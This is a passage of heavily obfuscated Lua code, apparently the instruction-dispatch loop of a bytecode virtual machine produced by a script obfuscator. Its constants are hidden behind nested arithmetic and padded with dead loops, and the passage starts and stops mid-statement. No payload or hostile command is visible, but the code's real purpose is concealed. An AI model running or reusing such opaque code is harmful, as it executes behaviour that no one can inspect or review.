(v161==(1 + 0 + 0))) then v164=nil;v165=nil;v161=2 + 0 ;end if (((4920 -(240 + 138 + 1))>=(15909 -11434)) and ((0 -(729 -(415 + 314)))==v161)) then local v309=0;while true do if ((v309==(1539 -(558 + 980))) or ((9861 -6786)>(151 + (6146 -2714)))) then v161=1533 -(1471 + 61) ;break;end if (((0 -0)==v309) or ((1016 + 2680)==(2355 -(928 + 215)))) then v162=1905 -(75 + 1830) ;v163=nil;v309=1448 -(1006 + 441) ;end end end end break;end if ((v160==(1386 -(1370 + 14))) or ((64 + 37)>=(38 + 362))) then v165=nil;v166=nil;v160=3 + 0 ;end if ((v160==(0 + 0 + 0)) or ((5979 -4420)==273)) then v161=0;v162=nil;v160=205 -(195 + 9) ;end if (((3568 -(986 + 786))>((549 -202) + 430)) and ((1 -0)==v160)) then v163=nil;v164=nil;v160=2 + 0 ;end end elseif (v95[v97[1 + 1 ]] or ((880 -(203 + (1179 -909)))==(7344 -4681))) then v83=v83 + ((425 + 88) -(450 + 62)) ;else v83=v97[7 -4 ];end elseif (((8313 -4488)==(12376 -8551)) and (v98<=((2115 -(1326 + 506)) -(148 + 112)))) then if ((v98<=(952 -(382 + 205 + 346))) or ((301 + 358)<(790 -(107 + 68)))) then if (((2994 -(333 + 305))==(403 + 1953)) and (v98<=(1407 -(911 + 479)))) then if ((v98>(1370 -(959 + 395))) or ((1314 -(29 + 153))==(13839 -9760))) then v95[v97[2 + 0 ]]={};else v95[v97[1596 -((1788 -(115 + 499)) + 420) ]]=v97[686 -(213 + 470) ]/v97[7 -3 ] ;end elseif (((1414 -(2720 -(1248 + 541)))<=(21017 -16347)) and (v98==(9 + 9))) then local v169=0 + 0 ;local v170;local v171;local v172;while true do if (((3925 -(735 + 250 + 152))<(6871 -2588)) and (v169==(192 -(125 + 33 + 33)))) then v172=nil;while true do if (((0 + 0)==v170) or ((4027 -(391 + 862))==(2638 -(508 + 220)))) then local v310=0 + 0 ;while true do if (((0 -0)==v310) or ((2500 + 420 + 656)>=(2908 + 837))) then v171=0 -0 ;v172=nil;v310=1828 -(22 + 1805) ;end if (((218 -119)<(3598 + 1379)) and (v310==(1 + (0 -0)))) then v170=1 + 0 + 0 ;break;end end end if ((v170==(4 -3)) or ((2193 + 639)==(1157 + 782))) then while true do if ((v171==(0 -0)) or (((2974 -(1071 + 578)) + 805)==(7579 -4105))) then v172=v97[1 + 1 ];v95[v172](v95[v172 + (1823 -(1668 + 154)) ]);break;end end break;end end break;end if ((v169==(304 -(102 + 202))) or ((1090 -((1292 -(653 + 503)) + 49))==(150 + 1381))) then v170=1598 -(162 + 1436) ;v171=nil;v169=687 -(590 + 96) ;end end else local v173=307 -(81 + 226) ;local v174;local v175;local v176;local v177;while true do if (((2507 -(737 + 82))>(3565 -2354)) and (v173==(0 -0))) then v174=0 + 0 ;v175=nil;v173=2 -1 ;end if (((59 + (3883 -(725 + 328)))==(9124 -6235)) and (v173==(1284 -(639 + 643)))) then while true do if (((1647 -(1291 + 356))==v174) or (((2472 -(931 + 216)) + 344)==(4355 -(393 + 27)))) then local v311=0 -0 ;local v312;while true do if ((((3019 -1132) -(1098 + 789))==v311) or ((12534 -9954)<(5 + 244))) then v312=0 -0 ;while true do if ((v312==(0 + 0)) or ((617 + 820)<336)) then v175=v97[911 -(159 + 750) ];v176={v95[v175](v13(v95,v175 + 1 + 0 ,v84))};v312=1 + 0 ;end if (((97 + 1046 + 276)<=(2237 + 1201)) and (v312==(2 -1))) then v174=1;break;end end break;end end end if ((v174==1) or ((1291 -((1767 -1242) + 73))>(1298 + 2045))) then v177=110 -(83 + 27) ;for v349=v175,v97[14 -10 ] do local v350=23 -(8 + (33 -18)) ;local v351;while true do if ((v350==(0 -0)) or ((1179 + 3522)<=4104)) then v351=0 -0 ;while true do if (((3003 + 1561)==((11397 -5988) -(419 + 426))) and (v351==(860 -((1753 -1214) + 321)))) then v177=v177 + ((5 -3) -1) ;v95[v349]=v176[v177];break;end end break;end end end break;end end break;end if (((5241 -(833 + 992))>=(135 + 864)) and (v173==(1 + 0 + 0))) then local v291=0 + 0 ;while true do if ((((2166 -(735 + 538)) + 1252)<=((10453 -4609) -1376)) and (v291==1)) then v173=3 -1 ;break;end if (((5989 -3280)<=(4414 -(493 + 115))) and (v291==(0 + 0))) then v176=nil;v177=nil;v291=1 + 0 + 0 ;end end end end end elseif ((v98<=((8 + 54) -(148 -107))) or ((21882 -17357)<(917 -(224 + 436)))) then if (((1028 -(331 + 173))<=(1069 + 2910)) and (v98>((303 -(97 + 205)) + 19))) then v95[v97[2 + 0 ]]=v36[v97[1023 -(692 + 328) ]];else v95[v97[(474 -303) -(88 + 81) ]]=v97[1050 -(265 + 782) ];end elseif ((v98>(5 + 17)) or ((1269 -398)==(846 + 1878))) then local v182=0 -0 ;local v183;local v184;local v185;while true do if (((11528 -7633)<=(1330 + 2954)) and (v182==(0 -0))) then v183=0;v184=nil;v182=3 -2 ;end if ((v182==(1 + (0 -0))) or ((3786 -(516 + 1380))==(4420 -(547 + 1393)))) then v185=nil;while true do if (((9617 -6397)==(4456 -(317 + 919))) and (v183==(231 -(218 + 12)))) then while true do if (((10509 -6643)<(12274 -8337)) and ((0 + (0 -0))==v184)) then v185=v97[1130 -(629 + 499) ];do return v95[v185](v13(v95,v185 + (2 -1) ,v97[13 -10 ]));end break;end end break;end if (((3088 -(105 + 1))<=(10265 -6747)) and (v183==(0 -0))) then local v313=1165 -(999 + 166) ;while true do if ((v313==(385 -(5 + 379))) or ((487 + 2917)<=(2453 -(242 + 56)))) then v183=958 -(569 + 388) ;break;end if ((v313==(0 -0)) or ((716 + 634 + 730)>(10853 -8385))) then v184=0 -0 ;v185=nil;v313=1373 -(986 + 386) ;end end end end break;end end else local v186=1676 -(603 + 1073) ;local v187;local v188;local v189;local v190;local v191;while true do if (((14102 -10528)>=(1873 + 866)) and ((256 -(201 + 53))==v186)) then v191=nil;while true do if ((v187==(1 + 0)) or ((4957 -(770 + 189))<(2901 -(8 + 426)))) then local v314=1600 -((2834 -2233) + 999) ;while true do if ((v314==(1 + 0)) or ((30 + 1052 + 551)>=(14090 -10460))) then v187=(686 -(132 + 217)) -(174 + 161) ;break;end if (((9556 -6371)<(3654 -(22 + 7))) and (v314==((0 -0) -0))) then v190=nil;v191=nil;v314=1037 -(419 + 617) ;end end end if (((777 + 278)==(1135 -(64 + 16))) and (v187==((1314 -(608 + 704)) + 0))) then while true do if ((v188==(1421 -(353 + 1067))) or ((330 + 878 + 3108)<=(2925 -(1419 + 65)))) then v191=0 + 0 ;for v411=v189,v97[914 -(249 + 661) ] do local v412=0 -0 ;local v413;while true do if (((988 + 2194)>=(282 -192)) and (v412==(0 -0))) then v413=0 + 0 ;while true do if ((((398 + 682) -(473 + 21))<=(4269 -1317)) and (v413==(0 + 0))) then v191=v191 + (1598 -(1202 + 395)) ;v95[v411]=v190[v191];break;end end break;end end end break;end if (((7712 -(3455 -(87 + 36)))>(1277 + 2080)) and (v188==((163 -(134 + 29)) + 0))) then local v375=1410 -((2123 -924) + 211) ;local v376;while true do if ((v375==(1925 -(657 + (3728 -2460)))) or ((4012 -(466 + 791))<=((2649 -(1646 + 14)) + 532))) then v376=0 + 0 ;while true do if ((v376==(0 + 0 + 0)) or ((4080 -(735 + 287))<=(46 + 59))) then local v450=1258 -(442 + 816) ;while true do if ((v450==((208 -(118 + 89)) + 0)) or (((3106 -2106) -787)>=(1265 -(1394 -477)))) then v376=669 -(333 + 335) ;break;end if ((4539==(5491 -(106 + 846))) and (v450==((1888 -(1419 + 469)) + 0))) then v189=v97[(1714 -(1338 + 372)) -2 ];v190={v95[v189](v95[v189 + 1 ])};v450=1071 -((905 -(398 + 82)) + 645) ;end end end if ((2323<(697 + 1905)) and ((1909 -(326 + 1582))==v376)) then v188=1 -0 ;break;end end break;end end end end break;end if (((0 + 0 + 0)==v187) or ((3228 -(993 + (463 -334)))<=(2888 -(134 + 1661)))) then local v315=0 -0 ;while true do if ((v315==(1 -0)) or ((9988 -7211)>=3917)) then v187=1 + 0 ;break;end if (((3743 -(417 + 202))>=(35 -22)) and (v315==(0 + 0))) then v188=0 -0 ;v189=nil;v315=353 -(86 + 218 + 48) ;end end end end break;end if ((v186==(0 -0)) or ((15705 -11726)<((24 + 4) -(1398 -(1372 + 22))))) then v187=0 -0 ;v188=nil;v186=1951 -(126 + 1824) ;end if ((1561==(2402 -(639 + 51 + 151))) and (v186==(755 -(605 + 149)))) then v189=nil;v190=nil;v186=570 -(264 + 304) ;end end end elseif ((((4317 + 10094) -9805)>(2448 -1169)) and (v98<=(14 + 13))) then if (((4741 -(578 + 1368))>=(5098 -3110)) and (v98<=25)) then if ((v98==(1307 -(1050 + 233))) or ((13423 -9334)==(184 + 85))) then v95[v97[2 + 0 ]][v95[v97[11 -8 ]]]=v95[v97[4 -0 ]];else v95[v97[1 + 1 ]][v97[690 -(356 + 331) ]]=v97[1 + 3 ];end elseif ((v98==(12 + 14)) or ((1818 + 130)==(5987 -(743 + 351)))) then v95[v97[2]]=v95[v97[3]] + v95[v97[(1451 -(498 + 951)) + 2 + 0 ]] ;else local v197=(3148 -(196 + 1276)) -(1246 + 430) ;local v198;local v199;local v200;local v201;while true do if ((v197==(0 -0)) or ((920 -502)>=(9650 -5029))) then v198=0 -0 ;v199=nil;v197=1 + 0 ;end if (((1456 + 148)<(4511 -(576 + 85))) and ((534 -(380 + (552 -400)))==v197)) then while true do if ((v198==(0 + (1580 -(1287 + 293)))) or ((2708 -(849 + 414))==(11367 -7523))) then local v316=0 -0 ;while true do if ((v316==((471 -(54 + 416)) + (0 -0))) or ((5426 -(580 + 1247))>=(4389 -(30 + 94)))) then v198=(2366 -(1055 + 899)) -(16 + 395) ;break;end if ((v316==(0 + 0)) or ((2425 -(212 + 11))>=(3933 -(207 + 1271)))) then v199=0 + 0 ;v200=nil;v316=1 -0 ;end end end if ((v198==(1 + 0)) or (1859==(3135 -1940))) then v201=nil;while true do if (((10128 -5512)>=((9282 -6459) -1029)) and (v199==(0 -0))) then local v377=0;local v378;while true do if ((v377==(0 + 0)) or ((18788 -14078)<(8185 -5217))) then v378=0 -0 ;while true do if ((((6219 -(38 + 13)) -(768 + 849))>=(5773 -2918)) and (v378==(1 + 0))) then v199=1 + (361 -(216 + 145)) ;break;end if (((7215 -2718)>=(161 + 1283)) and (v378==(1866 -((406 -252) + 1712)))) then v200=v97[2 -0 ];v201=v95[v200];v378=733 -(728 + 4) ;end end break;end end end if ((v199==(3 -(1 + 1))) or ((2919 -(790 + 305))>=(3230 -(249 + 285)))) then for v414=v200 + (1 -0) ,v97[1766 -(1636 + 127) ] do v7(v201,v95[v414]);end break;end end break;end end break;end if ((v197==(2 -1)) or ((1229 + 2448 + 18)>(213 + 3713))) then v200=nil;v201=nil;v197=5 -3 ;end end end elseif ((v98<=(58 -29)) or ((1191 + 2461)<(195 + 1362))) then if (((2467 -((1486 -978) + 393))>=(843 -443)) and (v98>(3 + 25))) then for v275=v97[7 -5 ],v97[(10 -7) + 0 ] do v95[v275]=nil;end else local v202=0;local v203;local v204;while true do if ((v202==(3 -2)) or (((1409 -(54 + 19)) -(323 + (667 -479)))>(12499 -9272))) then while true do if (((5970 -2357)<=(7564 -2796)) and (v203==(259 -(153 + 106)))) then v204=v97[(3 -2) + 1 ];v95[v204](v13(v95,v204 + (1870 -(289 + 1580)) + 0 ,v97[(100 -(70 + 29)) + 2 ]));break;end end break;end if (((69 + 864)<(2329 -(942 + (77 -40)))) and (v202==((0 + 0) -0))) then local v292=0 + 0 ;while true do if ((v292==(0 + 0)) or ((673 + 8)>=((4385 -1421) -(220 + 797)))) then v203=0 -0 ;v204=nil;v292=1799 -(1321 + 477) ;end if (((4308 -(467 + 1412))<(3720 + (2471 -(861 + 685)))) and (v292==(1 + 0))) then v202=159 -(114 + 44) ;break;end end end end end elseif ((v98>(106 -76)) or ((3375 + 82)>=(836 + 4107))) then v95[v97[4 -2 ]]=v95[v97[3 + 0 ]] + v97[2 + 2 ] ;elseif ((((3956 -3054) -(137 + 532))==(124 + 109)) and (v95[v97[(1719 -(1647 + 69)) -1 ]]<v95[v97[934 -(771 + 159) ]])) then v83=v83 + 1 + 0 ;else v83=v97[149 -(116 + 30) ];end elseif (((4065 -(875 + 702))<(11793 -(16938 -9186))) and (v98<=(8 + 39))) then if (((8723 -5141)==(14116 -10534)) and (v98<=(1057 -(35 + (2581 -(163 + 1435)))))) then if ((v98<=(9 + 26)) or ((3792 + 714)<(563 -((908 -(642 + 127)) + 309)))) then if ((((3221 -(422 + 109)) -(192 + 70))>(1787 -538)) and (v98<=(1672 -(1028 + 611)))) then if (((2844 -(114 + 126))>=(405 + 935)) and (v98==(1279 -(432 + 269 + 546)))) then if ((v95[v97[1752 -(1502 + 248) ]]==v95[v97[(1734 -(700 + 467)) -(174 + 389) ]]) or ((3154 -(77 + 1074))>(5449 -(420 + 190)))) then v83=v83 + (2 -1) + 0 + 0 ;else v83=v97[37 -(11 + 23) ];end else local v206=0 + 0 ;local v207;local v208;local v209;while true do if ((((1413 -1074) + 171)<(4276 + 237)) and (v206==(350 -(64 + 286)))) then v207=1522 -(260 + 1262) ;v208=nil;v206=1 + 0 ;end if ((v206==(1 + 0)) or ((2216 + 1082)>=(3332 + 414))) then v209=nil;while true do if ((v207==(1 -0)) or ((1439 + 1490)>3583)) then while true do if (((0 + (0 -0))==v208) or ((2047 -(44 + 86))>=(2694 + 1621))) then v209=v97[(886 -(826 + 55)) -3 ];v95[v209](v13(v95,v209 + (2 -1) ,v84));break;end end break;end if (((14156 -10422)>=((2490 -(144 + 1022)) -679)) and (v207==(0 -0))) then local v318=(0 + 0) -0 ;while true do if ((v318==(2 -1)) or ((1492 + 3450)==((49596 -38042) -6911))) then v207=3 -2 ;break;end if ((v318==((1938 -(493 + 1445)) + 0)) or ((11183 -8483)<(903 + 330))) then v208=0 -0 ;v209=nil;v318=1 -0 ;end end end end break;end end end elseif ((v98==(114 -80)) or ((728 + 414 + 3269)>=(1925 + 2488))) then local v210=228 -(61 + 167) ;local v211;local v212;local v213;local v214;local v215;local v216;while true do if (((4900 -3337)==(3326 -(3141 -(540 + 838)))) and ((5 -2)==v210)) then while true do if ((v211==(0 + 0)) or ((2321 + 2126)==(1665 -(390 + 896)))) then v212=v97[5 -(3 + 0) ];v213=v97[639 -(534 + (382 -281)) ];v211=1 -0 ;end if ((v211==2) or ((1154 -(95 + 100))>(722 + 3385))) then for v352=1 + 0 ,v213 do v95[v214 + v352 ]=v215[v352];end v216=v215[1];v211=165 -(122 + 40) ;end if (((6504 -(962 + 1012))>(3245 + 1090)) and (v211==(1382 -(705 + 674)))) then if (((4595 -2752)==(2791 -(365 + 583))) and v216) then local v355=0 -0 ;local v356;local v357;while true do if ((v355==(2 -1)) or ((6095 -(1444 + 291))>(5226 -(50 + 793)))) then while true do if (((16007 -11178)>(4125 -1257)) and ((1138 -(551 + 587))==v356)) then v357=0 -0 ;while true do if (((161 + 1807)==(1436 + (1853 -(1034 + 287)))) and (v357==(0 -0))) then v95[v214]=v216;v83=v97[2 + 1 + 0 ];break;end end break;end end break;end if ((v355==(0 -0)) or ((3454 -2183)>(2084 + 1576))) then v356=496 -(18 + 383 + 95) ;v357=nil;v355=1 + 0 ;end end else v83=v83 + (57 -(44 + (16 -4))) ;end break;end if (((4537 -(19 + 101))>=(15776 -11773)) and (v211==(1 + (950 -(866 + 84))))) then local v322=0 + 0 ;while true do if ((v322==(1 + 0)) or ((3792 -(562 + 963))<=((2969 -(1156 + 394)) -878))) then v211=2;break;end if ((v322==(0 + 0)) or ((3339 -(300 + (228 -158)))>(1484 + (4624 -(403 + 1316))))) then v214=v212 + 2 + 0 ;v215={v95[v212](v95[v212 + (4 -(1988 -(1575 + 410))) ],v95[v214])};v322=353 -(327 + 25) ;end end end end break;end if (((1420 + 1369)>(1978 + 796)) and (v210==(5 -3))) then v215=nil;v216=nil;v210=5 -2 ;end if (((4483 -2549)==(401 + 1533)) and (v210==(0 + 0))) then v211=883 -(185 + 698) ;v212=nil;v210=3 -2 ;end if (((243 -((535 -(36 + 375)) + 118))==v210) or ((416 + (8841 -5495))>4649)) then v213=nil;v214=nil;v210=3 -1 ;end end else v95[v97[(1449 + 267) -(1654 + 60) ]]=v97[6 -3 ]~=(0 -0) ;end elseif ((v98<=(716 -((2409 -(1197 + 730)) + 197))) or ((6764 -(3885 + 534))<(1499 -(228 + 94)))) then if (((1623 -839)==(3490 -2706)) and (v98==(32 + 4))) then local v218=0 -0 ;local v219;local v220;while true do if ((v218==(0 + 0)) or ((2955 + 1174)<=(2303 -(558 + 508)))) then v219=0 + 0 ;v220=nil;v218=1 + 0 ;end if ((v218==(2 -1)) or ((2377 -924)>(309 + 3582))) then while true do if ((((4246 -2690) + 212 + 47)<=(3316 + 1433)) and (v219==(0 -0))) then v220=0 -0 ;while true do if (((421 + 1117)>(218 + 513)) and (v220==((1130 -(29 + 1101)) + 0))) then v95[v97[2 -0 ]]=v97[1227 -(85 + 1139) ]~=(425 -(18 + 4 + 403)) ;v83=v83 + 1 + 0 ;break;end end break;end end break;end end else v37[v97[3 + 0 ]]=v95[v97[1 + 1 ]];end elseif (((3713 + 77)>=(24 + 1120)) and (v98>(83 -45))) then local v223=534 -(167 + 367) ;local v224;local v225;local v226;local v227;local v228;while true do if (((5085 -(188 + 34))>=(232 + 4392)) and (v223==(0 -0))) then v224=0 -0 ;v225=nil;v223=(2 -1) + 0 ;end if (((3 -2)==v223) or (((7038 -(464 + 1197)) -(3543 -(164 + 211)))<(95 + 883))) then v226=nil;v227=nil;v223=4 -2 ;end if ((v223==((4 -2) -0)) or ((1878 + 794)<(153 -119))) then v228=nil;while true do if (((5982 -2744)<(11289 -7825)) and (v224==(1 + 0))) then local v323=(0 -0) -0 ;while true do if (((1634 + 316)==((89 + 2524) -(403 + 260))) and (v323==1)) then v224=1 + 1 ;break;end if (((0 + 0)==v323) or ((652 + (313 -151))>(1584 + 3192))) then v227=nil;v228=nil;v323=2 -1 ;end end end if ((3880<((459 + 5275) -(700 + 64))) and ((0 -0)==v224)) then v225=0 -0 ;v226=nil;v224=1;end if ((v224==((103 -(7 + 94)) -0)) or ((294 + 1782)==(441 + 2294))) then while true do if ((((3657 -2566) -(469 + 622))==v225) or ((2614 -(281 + 1181))>=(1930 + 2789))) then local v381=0 + 0 ;local v382;while true do if ((v381==((2640 -(902 + 1015)) -(96 + 627))) or ((6491 -4105)==(1307 -(962 + 253)))) then v382=108 -(93 + 15) ;while true do if ((v382==(1962 -((2920 -(944 + 823)) + 808))) or ((1465 + 2931)<=(1152 -(65 + 224)))) then v225=1 -0 ;break;end if (((0 + 0)==v382) or ((651 -(583 + 10))>(171 -103))) then v226=v97[2 + 0 ];v227=v95[v226];v382=1 + 0 ;end end break;end end end if (((5885 -(254 + 1663))>(86 -(51 + 15))) and (v225==((1864 -(1542 + 319)) -2))) then v228=v97[3 + 0 ];for v415=2 -1 ,v228 do v227[v415]=v95[v226 + v415 ];end break;end end break;end end break;end end else local v229=0 + 0 ;local v230;local v231;local v232;local v233;local v234;while true do if (((6344 -(811 + 1010))>=(2297 + 1139)) and (v229==(2 + 0))) then v234=nil;while true do if (((12492 -8694)>(5325 -3769)) and (v230==((1691 -(1565 + 126)) + 0))) then local v324=0 -0 ;while true do if (((2715 + 550)==(8810 -5545)) and (v324==(0 -(0 + 0)))) then v231=800 -(613 + 187) ;v232=nil;v324=(3 -2) + 0 ;end if (((13716 -9356)>=((6001 -(22 + 855)) -3051)) and (v324==(1078 -(140 + 937)))) then v230=3 -2 ;break;end end end if (((1133 + 1645)<=(6309 -(450 + 1421))) and (v230==(1 + 0))) then v233=nil;v234=nil;v230=1969 -((1809 -(1037 + 524)) + 1719) ;end if ((v230==(4 -2)) or ((272 + 2449)>(3683 + 1098))) then while true do if ((v231==((92 -(46 + 46)) + 0)) or ((6084 -(112 + 43 + 1059))==(3183 -1232))) then local v384=0 -0 ;local v385;while true do if ((v384==(0 -(0 -0))) or ((8059 -(446 + 4220))<(959 -740))) then v385=0 -(668 -(471 + 197)) ;while true do if (((872 + 312 + 288)>(702 + 58)) and (v385==(0 -0))) then local v455=0 + 0 ;while true do if (((9802 -4921)>(7433 -4980)) and (v455==(0 + 0))) then v232=v97[1 + (1854 -(1802 + 51)) ];v233=v95[v232];v455=2 -1 ;end if (((4782 -(415 + 214))==(5281 -(1051 + 77))) and (v455==(711 -(477 + 233)))) then v385=1 + 0 ;break;end end end if (((163 + 1121)<=(18049 -(3551 + 10582))) and (v385==(2 -1))) then v231=1214 -(100 + 1113) ;break;end end break;end end end if ((v231==(933 -(305 + 627))) or ((2725 -(93 + 275))==(3182 -(492 + 822)))) then v234=v95[v232 + 1 + 1 ];if ((v234>(1957 -(1114 + 843))) or (((4783 -1742) -(28 + 1))>=(6987 -3693))) then if (((10686 -6620)>=((1403 -(489 + 148)) -205)) and (v233>v95[v232 + (2 -1) ])) then v83=v97[9 -(6 + 0) ];else v95[v232 + (4 -3) + 2 ]=v233;end elseif (((2182 -(34 + 1))<(8518 -3779)) and (v233<v95[v232 + 1 + 0 ])) then v83=v97[2 + 1 ];else v95[v232 + (453 -(79 + 371)) ]=v233;end break;end end break;end end break;end if ((v229==(695 -(679 + 15))) or ((8999 -6357)<=(2902 -2092))) then v232=nil;v233=nil;v229=1 + 1 ;end if (((457 + 577)<=(4203 -(457 + 574))) and (v229==(0 -0))) then v230=0 + 0 ;v231=nil;v229=2 -1 ;end end end elseif ((v98<=(169 -126)) or ((79 + 765)>=(10571 -6374))) then if ((v98<=(13 + 28)) or ((2975 + 1037)<=(3157 -(1364 + 314)))) then if (((1811 + 2081)==(2252 + 1640)) and (v98==(537 -(200 + 297)))) then v83=v97[1 + 2 ];elseif (((1007 + 1570)>=(3494 -2502)) and (v95[v97[2 + 0 ]]==v97[1626 -(716 + 906) ])) then v83=v83 + 1 + 0 ;else v83=v97[1745 -(1112 + 630) ];end elseif ((v98==(441 -((495 -238) + 142))) or ((6192 -3294)<=(749 -182))) then local v236=0 + 0 ;local v237;local v238;while true do if (((1 -0)==v236) or ((6942 -4916)>=(7377 -3368))) then for v295=1379 -(472 + 906) , #v94 do local v296=610 -(232 + 378) ;local v297;local v298;while true do if ((4497>(8340 -4593)) and ((1 + 0)==v296)) then while true do if (((6951 -4418)==(3432 -(853 + 46))) and (v297==(0 + 0))) then v298=v94[v295];for v424=0 + 0 , #v298 do local v425=0 -0 ;local v426;local v427;local v428;local v429;while true do if (((103 + (1685 -1143))<=(7497 -4926)) and (v425==(468 -(187 + 281)))) then v426=0;v427=nil;v425=538 -(38 + 499) ;end if (((3725 + 494)>(465 + 732)) and (v425==((2188 -(164 + 1134)) -(16 + (1209 -337))))) then while true do if (((517 -(12 + 242))<(1997 -(1003 + 182))) and (v426==(0 -0))) then local v464=(0 -0) -(0 -0) ;local v465;while true do if ((((3884 + 1310) -(274 + 92))>(4494 -(1366 + 382))) and (v464==(0 -0))) then v465=0 -0 ;while true do if (((19888 -15176)>=((649 + 717) -(861 + 112))) and ((551 -(337 + 213))==v465)) then v426=1304 -(1224 + 79) ;break;end if (((56 + 17)<(74 + (282 -219))) and (v465==(0 -0))) then local v504=558 -(375 + 183) ;while true do if ((v504==(1 -0)) or (3421<(30 + 877))) then v465=1 -0 ;break;end if (((492 -(149 + 343))==v504) or ((4524 -(132 + (337 -(37 + 152))))<(2473 -(999 + 981)))) then v427=v298[v424];v428=v427[901 -(616 + 284) ];v504=(1 + 0) -0 ;end end end end break;end end end if (((5569 -(93 + 1527))<=(5844 -(298 + 714))) and (v426==((64 + 87) -(133 + 17)))) then v429=v427[140 -(135 + 3) ];if (((v428==v95) and (v429>=v237)) or ((61 + 2503)>=(3818 -835))) then local v490=0 + 0 ;while true do if ((v490==((0 + 0) -0)) or ((30 -20)==(11366 -8470))) then v238[v429]=v428[v429];v427[2 -1 ]=v238;break;end end end break;end end break;end if (((2539 + 103)>(2855 -(418 + 361))) and (v425==(2 -1))) then v428=nil;v429=nil;v425=(3 + 2) -3 ;end end end break;end end break;end if ((v296==(0 -0)) or ((1651 -(157 + 168))>((3682 -(583 + 732)) + 720))) then v297=(0 -0) + 0 ;v298=nil;v296=1 + 0 ;end end end break;end if ((v236==((0 -0) -0)) or ((2923 -(1190 + 33))<(699 -(110 + 484)))) then local v293=671 -(466 + 205) ;while true do if (((212 -115)==((174 + 89) -166)) and (v293==(0 -0))) then v237=v97[2];v238={};v293=1 + 0 ;end if ((v293==(1 + 0)) or (((9074 -3196) -3598)==(4989 -(1002 + 888)))) then v236=1227 -(213 + 1013) ;break;end end end end else v95[v97[(1076 -(1023 + 50)) -1 ]]=v95[v97[3 + 0 ]]%v97[11 -(27 -20) ] ;end elseif (((5049 -(248 + 753))>=(5028 -(6592 -3499))) and (v98<=(1929 -(1177 + 707)))) then if ((v98==44) or (3799<=(351 + 3032))) then v95[v97[6 -4 ]]=v95[v97[14 -11 ]] -v95[v97[689 -(657 + 28) ]] ;else v95[v97[2 + 0 ]]=v95[v97[3 + 0 ]] * v95[v97[1 + 3 ]] ;end elseif ((v98>(1 + 45)) or ((3149 -924)>(1860 + 948))) then local v242=0 -0 ;local v243;local v244;while true do if (((1840 + 3058)>(7890 -4676)) and (v242==(1 -0))) then while true do if (((0 -0)==v243) or (((1520 -928) + 1113)==(8572 -3980))) then v244=v97[7 -5 ];do return v13(v95,v244,v84);end break;end end break;end if (((1349 + 3528)>(1685 -830)) and (v242==(729 -(10 + 9 + 710)))) then v243=0 -0 ;v244=nil;v242=847 -(769 + 77) ;end end elseif (((6547 -(458 + 2233))==(5068 -1212)) and (v95[v97[5 -3 ]]~=v97[(3 -2) + 3 ])) then v83=v83 + (41 -(12 + 28)) ;else v83=v97[743 -(583 + 157) ];end elseif ((v98<=((129 -78) + 4)) or ((1453 -(1897 -1401))>=(7133 -4443))) then if (((1709 -(70 + 266))<((1844 -(1186 + 578)) + 3094)) and (v98<=51)) then if ((v98<=(1207 -(8 + 1150))) or ((650 -(65 + 185))>=((16242 -7958) -(6922 -(200 + 1438))))) then if (((4285 -(15 + 811 + (860 -(62 + 52))))>=((3103 -(1278 + 533)) + 1123)) and (v98>48)) then local v245=1480 -(1111 + 139 + 230) ;local v246;local v247;while true do if (((5216 -(764 + 1089))>=((2391 -(338 + 674)) -(653 + 343))) and (v245==(522 -(96 + 37 + (836 -447))))) then v246=451 -(311 + 140) ;v247=nil;v245=1 + 0 + 0 ;end if ((v245==(1 -0)) or ((1732 + 244)>=(5383 -(109 + 147 + 1403)))) then while true do if (((363 + 12)<(19 + 915)) and (v246==(0 -0))) then v247=v97[3 -1 ];v95[v247]=v95[v247](v95[v247 + ((3 + 0) -2) ]);break;end end break;end end else v95[v97[2 + 0 ]]=v95[v97[3]] * v97[3 + 1 ] ;end elseif (((4695 -(437 + 30))>(1599 + 132)) and (v98>(31 + 19))) then local v249=1802 -(1713 + (175 -86)) ;local v250;local v251;local v252;while true do if ((((1 + 2) -2)==v249) or ((3705 + 972)==(7760 -4169))) then v252=nil;while true do if ((v250==(1127 -(713 + 414))) or ((230 + 6)>=(1701 + 3204))) then v251=(0 + 0) -0 ;v252=nil;v250=1 + 0 ;end if (((1617 -((1240 -627) + 556))<(6508 -4739)) and (v250==(1098 -(18 + 1079)))) then while true do if (((4841 -(40 + 1504))>=((5567 -(1035 + 457)) -(1128 + 482))) and (v251==0)) then v252=v97[1688 -(1503 + 183) ];v95[v252]=v95[v252]();break;end end break;end end break;end if ((v249==(0 + 0)) or ((3455 -1953)>((582 + 5352) -(1615 + 221)))) then v250=0 -0 ;v251=nil;v249=110 -(10 + 99) ;end end else v95[v97[1 + 1 ]][v97[3 + 0 ]]=v95[v97[1604 -((4102 -2884) + 382) ]];end elseif (((4387 -2223)>=(771 -578)) and (v98<=(52 + 1))) then if ((((1175 -(151 + 48)) + 405)<(3664 -(209 + 1071))) and (v98>(613 -(547 + 14)))) then local v255=1884 -(636 + 1248) ;local v256;local v257;local v258;while true do if (((10552 -(6468 -(20 + 28)))>=(4096 -3002)) and (v255==(0 -0))) then v256=0 + 0 ;v257=nil;v255=1 -0 ;end if (((2025 + 452)>=(151 + 919)) and (v255==(1 + 0))) then v258=nil;while true do if (((7294 -3699)<=(12560 -8167)) and (v256==(0 -(0 -0)))) then local v329=0 -0 ;while true do if ((v329==(0 -0)) or ((9532 -5519)<(87 + 314))) then v257=0 + 0 ;v258=nil;v329=1 -0 ;end if (((2019 + 1470)==(3087 + 402)) and (v329==(1 -0))) then v256=1 + 0 ;break;end end end if (((4555 -(1076 + (792 -489)))>=(6264 -3347)) and (v256==(1 + 0))) then while true do if (((8090 -(2399 + 1052))>=(15 + 376)) and (v257==(492 -(332 + 160)))) then v258=v97[2];v95[v258]=v95[v258](v13(v95,v258 + (674 -(260 + 413)) ,v84));break;end end break;end end break;end end else v95[v97[1 + 1 ]]= -v95[v97[1906 -(1197 + 706) ]];end elseif ((v98>(37 + 17)) or ((1443 + 2126)<=(4860 -(44 + 1671)))) then local v260=0 -0 ;local v261;local v262;local v263;local v264;while true do if (((5157 -(245 + 1033))>=(2527 -(460 + 1397))) and ((0 -(0 -0))==v260)) then v261=0 + 0 ;v262=nil;v260=2 -1 ;end if ((v260==2) or ((2842 -(581 + 100))>=(6864 -3573))) then while true do if (((3780 + 740)==(15252 -10732)) and (0==v261)) then local v330=0 + 0 ;while true do if (((18079 -13252)>=(4205 -2509)) and (v330==(1 + 0))) then v261=1 + 0 ;break;end if (((11068 -6382)>=(3014 + 73 + 174)) and (v330==((1660 -(777 + 883)) -0))) then v262=v97[1154 -(213 + 939) ];v263=v95[v262 + (5 -3) ];v330=515 -(96 + 